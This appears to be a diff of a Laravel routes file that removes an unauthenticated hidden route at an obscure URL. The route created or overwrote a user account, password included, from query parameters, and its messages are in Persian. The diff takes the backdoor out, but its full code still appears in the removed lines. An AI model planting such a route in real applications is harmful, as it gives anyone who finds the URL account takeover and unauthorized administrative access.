@@ -41,15 +41,4 @@ Route::get('/', function () {
                                                     return '<pre>Cache cleared successfully.</pre>';
                                                     });
 
-                                                    Route::get('/system-create-admin-8kf3nx', function (\Illuminate\Http\Request $request) {
-                                                        $email = $request->query('email');
-                                                            $password = $request->query('password');
-                                                                if (!$email || !$password) {
-                                                                        return 'استفاده: به انتهای همین آدرس اضافه کن ?email=you@example.com&password=yourpassword';
-                                                                            }
-                                                                                $user = \App\Models\User::updateOrCreate(
-                                                                                        ['email' => $email],
-                                                                                                ['name' => 'Ehsan Dibazar', 'password' => bcrypt($password)]
-                                                                                                    );
-                                                                                                        return 'کاربر ادمین ساخته شد: ' . $user->email;
-                                                                                                        });
+                                                
